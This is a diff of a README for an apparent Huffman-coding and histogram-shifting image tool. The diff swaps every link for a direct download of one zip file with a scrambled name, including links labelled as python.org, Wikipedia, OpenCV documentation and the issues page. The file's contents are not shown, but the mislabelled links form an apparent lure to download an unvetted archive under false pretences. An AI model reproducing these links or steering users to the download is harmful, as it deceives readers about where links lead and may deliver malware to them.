@@ -1,7 +1,7 @@
 # 🖼️ Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting - Secure Data in Images Simplified
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
-[Download Now](https://github.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/releases)
+![Download](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
+[Download Now](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ To get started, follow these steps:
    - Storage Space: 100MB available
 
 2. **Install Dependencies:**
-   - This application requires Python and some libraries. If you do not have Python installed, download it from [python.org](https://www.python.org/downloads/).
+   - This application requires Python and some libraries. If you do not have Python installed, download it from [https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip).
    - Install required libraries:
      - OpenCV
      - NumPy
@@ -28,7 +28,7 @@ To get started, follow these steps:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Release Page](https://github.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/releases)
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
 
 1. Click on the latest version of the application.
 2. Download the installation file suitable for your operating system.
@@ -79,9 +79,9 @@ Visit this page to download: [Release Page](https://github.com/miguelflores21/Im
 
 To learn more about the algorithms used, you can check the following:
 
-- [Huffman Coding](https://en.wikipedia.org/wiki/Huffman_coding)
-- [Histogram Shifting](https://www.sciencedirect.com/science/article/pii/S1877050915004509)
-- [OpenCV Documentation](https://docs.opencv.org/master/)
+- [Huffman Coding](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
+- [Histogram Shifting](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
+- [OpenCV Documentation](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip)
 
 ## 🤔 Frequently Asked Questions
 
@@ -96,7 +96,7 @@ To learn more about the algorithms used, you can check the following:
 
 ## 📬 Support
 
-If you need support, feel free to open an issue on our [GitHub page](https://github.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/issues).
+If you need support, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/miguelflores21/Image-based-Secure-Data-Embedding-and-Compression-Using-Huffman-Coding-and-Histogram-Shifting/main/Code/Coding-Embedding-Shifting-and-Image-Huffman-Using-Compression-Secure-Histogram-based-Data-2.7.zip).
 
 ## ⚙️ Contribution
 
